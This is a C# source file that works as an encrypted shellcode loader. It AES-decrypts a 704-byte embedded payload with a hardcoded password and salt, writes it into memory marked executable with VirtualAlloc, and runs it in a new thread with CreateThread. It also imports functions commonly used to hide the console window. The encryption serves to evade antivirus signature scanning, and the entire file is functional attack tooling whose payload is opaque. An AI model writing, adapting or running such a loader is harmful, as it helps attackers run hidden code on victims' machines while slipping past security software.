using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;


public class Program
{

    //https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32")]
    static extern IntPtr GetConsoleWindow();

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    public static void Main()
    {

        byte[] passwordBytes = Encoding.UTF8.GetBytes("un4x");
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

        byte[] aesshellcode = new byte[704] { 0xc8, 0x72, 0xd9, 0x1b, 0x9f, 0x8d, 0x09, 0x3f, 0x89, 0x24, 0x75, 0xdf, 0xe4, 0x17, 0xba, 0xe9, 0xa6, 0xa8, 0xa5, 0x27, 0x4c, 0x4e, 0x7e, 0x83, 0x9f, 0x5e, 0x88, 0xb0, 0xaf, 0x33, 0x9d, 0x67, 0x82, 0xc0, 0x70, 0x75, 0x0e, 0x11, 0x59, 0x1f, 0xb9, 0x76, 0xdf, 0xcb, 0x3b, 0xe4, 0xf3, 0xab, 0xfa, 0x05, 0xae, 0xa7, 0xa5, 0xa8, 0x20, 0x37, 0xa7, 0xbd, 0x7a, 0x8b, 0x2d, 0xd7, 0x2a, 0x69, 0x9f, 0xce, 0x7b, 0x37, 0xe2, 0xe4, 0xa7, 0x2b, 0x21, 0xee, 0xa4, 0x37, 0xad, 0x79, 0x69, 0x1c, 0x0e, 0x95, 0x3b, 0x20, 0x23, 0xe2, 0x4c, 0x51, 0xcb, 0xde, 0x69, 0xec, 0xac, 0x1e, 0xa1, 0xaa, 0x66, 0xad, 0x95, 0x41, 0xba, 0x30, 0x39, 0xf5, 0x70, 0xe4, 0x81, 0x09, 0xd7, 0x10, 0xa4, 0x83, 0xda, 0x2a, 0xb3, 0x98, 0xdc, 0x6d, 0x70, 0xaa, 0x7b, 0x95, 0xec, 0xc9, 0x33, 0xbe, 0x84, 0x2a, 0xf0, 0x7a, 0xc1, 0x17, 0x00, 0xff, 0x8c, 0x35, 0x30, 0xce, 0x04, 0x15, 0x85, 0x9f, 0x75, 0xce, 0x50, 0xe7, 0xd5, 0x9c, 0x0e, 0x58, 0x50, 0xf0, 0x08, 0x2e, 0x5c, 0xa2, 0xab, 0x39, 0x70, 0xdb, 0xda, 0x3c, 0x27, 0x45, 0xcc, 0x0f, 0xe6, 0x76, 0x1a, 0x1b, 0x79, 0xcb, 0x67, 0x0c, 0x08, 0x27, 0x92, 0x68, 0xb8, 0xaa, 0xe4, 0xf9, 0x1d, 0x76, 0x87, 0x56, 0x97, 0x39, 0x27, 0xfb, 0x05, 0x19, 0x15, 0x35, 0xf7, 0xbe, 0x92, 0x8d, 0x06, 0x8c, 0xab, 0xc8, 0x4c, 0x54, 0x60, 0x04, 0xae, 0xb7, 0xd2, 0xd2, 0x8e, 0x34, 0x68, 0x98, 0xc0, 0x71, 0x43, 0xd6, 0x0e, 0x2b, 0x48, 0xf7, 0x73, 0x5c, 0xf8, 0x08, 0xa5, 0x60, 0xc9, 0xb6, 0xeb, 0xb6, 0x96, 0x6e, 0xc3, 0x32, 0xaa, 0xb8, 0x9e, 0x52, 0x7b, 0x81, 0x7a, 0x91, 0xc3, 0x61, 0xe6, 0x63, 0xc0, 0x7a, 0x56, 0x12, 0xc7, 0x75, 0x14, 0x59, 0x01, 0x9d, 0xfc, 0x6b, 0x9d, 0x7c, 0xa4, 0xe0, 0xb7, 0xf2, 0xd5, 0x5c, 0x50, 0x3f, 0x47, 0x8a, 0xd5, 0xef, 0xf0, 0x51, 0xcd, 0x6d, 0x83, 0x2a, 0x16, 0xf9, 0xfc, 0x17, 0x31, 0xb8, 0x12, 0x48, 0xb6, 0x81, 0xd0, 0x64, 0x48, 0x49, 0xd0, 0xda, 0xdc, 0x2f, 0x6f, 0x7d, 0x4b, 0x76, 0xe3, 0xb0, 0x4b, 0xea, 0x71, 0x50, 0xa5, 0x5b, 0x51, 0x5e, 0x4a, 0x3a, 0x37, 0x8f, 0xa7, 0xd8, 0x39, 0x2d, 0x8b, 0x88, 0xdd, 0x6c, 0x79, 0x5e, 0xe8, 0xfa, 0xd4, 0xfb, 0x24, 0xb9, 0xe7, 0xd1, 0x0e, 0x31, 0x98, 0x24, 0xe2, 0x41, 0x3d, 0xc7, 0x18, 0xba, 0xce, 0x98, 0x24, 0xd1, 0xb6, 0xa7, 0x78, 0xc1, 0xd9, 0x92, 0x0a, 0x44, 0xfd, 0x7b, 0x65, 0x3d, 0xf4, 0x92, 0x13, 0x8c, 0x20, 0x3d, 0xdd, 0x9b, 0xed, 0xdb, 0xd7, 0x85, 0x68, 0x15, 0x9b, 0xa9, 0x53, 0xfe, 0x37, 0x09, 0x81, 0x81, 0x2e, 0x0f, 0xc7, 0xae, 0xe8, 0xbf, 0x84, 0x37, 0x6c, 0xf8, 0x23, 0x75, 0x4b, 0x22, 0x3a, 0xd7, 0x0c, 0xd0, 0x7b, 0xa6, 0xf6, 0x2b, 0x42, 0x95, 0xe1, 0xbf, 0x24, 0xc0, 0xac, 0xfc, 0x6f, 0x2d, 0xec, 0x3b, 0x03, 0x06, 0x39, 0x06, 0x67, 0x7c, 0x51, 0x81, 0xc1, 0x79, 0xf8, 0x21, 0x65, 0x73, 0x9b, 0x5d, 0xd6, 0x94, 0xdf, 0x2d, 0x14, 0xee, 0x0a, 0x5a, 0xea, 0xeb, 0xe9, 0xa1, 0xbe, 0x7f, 0x65, 0x3c, 0x1e, 0xaa, 0xda, 0x5f, 0x8f, 0xb5, 0xc5, 0x42, 0x1c, 0xc7, 0x48, 0xdf, 0xf9, 0x2c, 0xa5, 0x17, 0xf4, 0x58, 0x43, 0xee, 0x7a, 0x04, 0x44, 0x0c, 0x61, 0x93, 0x44, 0x66, 0x3c, 0x9d, 0xb1, 0xb7, 0x8d, 0xa8, 0xaa, 0x2a, 0x97, 0x1c, 0xa9, 0x05, 0x21, 0x22, 0x2f, 0x3a, 0x5d, 0x97, 0x91, 0x32, 0x2c, 0x95, 0x54, 0x0b, 0x7e, 0xfb, 0xdb, 0x04, 0x8e, 0xf0, 0x23, 0x65, 0x68, 0x8b, 0x54, 0x50, 0xc0, 0x2f, 0x3b, 0xd1, 0x17, 0xd7, 0x5f, 0xe1, 0x84, 0xc2, 0xdc, 0x9e, 0x9b, 0x94, 0x7d, 0xc2, 0xad, 0xf4, 0xc8, 0x69, 0x00, 0xdc, 0xcc, 0x45, 0x5a, 0xe9, 0xc6, 0xfd, 0x27, 0x9e, 0x65, 0xdb, 0x50, 0x39, 0xfb, 0x3b, 0x76, 0x30, 0x87, 0x16, 0x92, 0x81, 0x78, 0xf5, 0x42, 0x55, 0x11, 0xbb, 0xe5, 0xe8, 0x95, 0x2d, 0x2a, 0xdd, 0xa5, 0x0c, 0x03, 0x41, 0x9b, 0x8a, 0xa7, 0x51, 0x7a, 0x66, 0x20, 0xaf, 0xbe, 0x4e, 0x62, 0xc6, 0x1a, 0x13, 0xf9, 0x2e, 0x9b, 0xec, 0xe5, 0x71, 0x34, 0xfa, 0x8f, 0x5d, 0xcd, 0x16, 0xdb, 0x20, 0x6b, 0xcb, 0x73, 0x28, 0x3a, 0x63, 0x9c, 0x48, 0x16, 0x89, 0x2a, 0xf8, 0x5a, 0x1c, 0x5a, 0x1f, 0x9b, 0x8c, 0x80, 0x64, 0xc5, 0xd0, 0x19, 0x5c, 0x6e, 0x9e, 0xf6, 0x32, 0x19, 0x7e, 0x85, 0xeb, 0x60, 0xbb, 0x08, 0x39, 0x3e, 0x39, 0x71, 0xdb, 0xc8, 0x3b, 0x99, 0x44, 0xcb, 0x83, 0x35, 0x25, 0xa4, 0xf6, 0x54, 0xa9, 0x5f, 0x97, 0xdb, 0x08, 0xca, 0x8a, 0xa7, 0xd5, 0xf2, 0x29, 0x65, 0xed, 0x60, 0xe6, 0xa9, 0x14, 0x52, 0x19, 0x5c, 0x75, 0x01, 0x6d, 0xa1, 0x7f, 0xa4, 0xd9, 0x57, 0xe9, 0x6a, 0x3c, 0x6a, 0xad, 0x22, 0x67, 0x03, 0x53, 0x19, 0xc0, 0x18, 0xb5, 0x18, 0xe0, 0xf8, 0xcb, 0xd1, 0x70, 0x62, 0x00, 0x0b, 0x61, 0xc5, 0x86, 0x63, 0x4d };
        byte[] shellcode = AES_Decrypt(aesshellcode, passwordBytes);

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        return;

    }


    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
        byte[] encryptedBytes = null;
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }
                encryptedBytes = ms.ToArray();
            }
        }

        return encryptedBytes;
    }

    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] decryptedBytes = null;
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cs.Close();
                }
                decryptedBytes = ms.ToArray();
            }
        }

        return decryptedBytes;
    }

}